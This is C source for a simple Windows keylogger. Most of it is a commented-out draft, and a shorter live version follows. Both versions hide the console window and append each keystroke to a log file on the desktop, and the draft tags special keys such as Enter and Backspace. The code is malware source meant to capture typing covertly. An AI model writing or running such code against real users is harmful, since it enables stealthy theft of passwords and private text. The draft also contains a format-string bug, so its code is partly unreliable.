// #include <stdio.h>
// #include <conio.h>
// #include <windows.h>
// #include <time.h>

// #define PATH "C:/Users/User/Desktop/Linux/keyl/data.txt" // The path to the log file

// int main(){
//     char capture;
//     FILE *file;

//     // Time stuff.
//     time_t t;
//     t = time(NULL);
//     // Hide the window
//     HWND window;
//     AllocConsole();
//     window=FindWindowA("ConsoleWindowClass",NULL);
//     ShowWindow(window,0);

//     file = fopen(PATH, "a+");

//     while(1)
//     {
//        // Sleep(20); // To make sure this program doesn't steal all resources.
//         if (kbhit())
//         {
//             fprintf(stderr, "%s", kbhit());
//             capture = getch();
//             fprintf(stderr, "%s", "capture");

//             // Just add in some helper strings here to the file, feel free to modify these to your needs.
//             switch ((int)capture){
//                 case ' ': // Space key...obviously.
//                     fprintf(file, " ");
//                     break;
//                 case 0x09: // Tab key.
//                     fprintf(file, "[TAB]");
//                     break;
//                 case 0x0D: // Enter key.
//                     fprintf(file, "[ENTER]");
//                     break;
//                 case 0x1B: // Escape key.
//                     fprintf(file, "[ESC]");
//                     break;
//                 case 0x08: // Backspace key.
//                     fprintf(file, "[BACKSPACE]");
//                     break;
//                 default:
//                     fputc(capture,file); // Put any other inputted key into the file.
//             }

//             if ( (int) capture == 27 ){  // The escape key. You can change this to anything you want.
//                 fclose(file);
//                 return 0;
//             }
//         }else{

//         }
//     }
// }

// #include <stdio.h>
// #include <conio.h>
 
// int main()
// {
//     while (!kbhit()){
//         printf("Press a key\n");
//     }
    
//     return 0;
// }

#define PATH "C:/Users/User/Desktop/Linux/keyl/data.txt" // The path to the log file

#include <stdio.h>   
#include <conio.h>   
#include <windows.h>

int main()  
{  
    FILE *file;
    file = fopen(PATH, "a+");

    HWND window;
    AllocConsole();
    window=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(window,0);

    while (1){
       putc(getch(), file); // print a character entered by the user  
    }
    return 0;  
}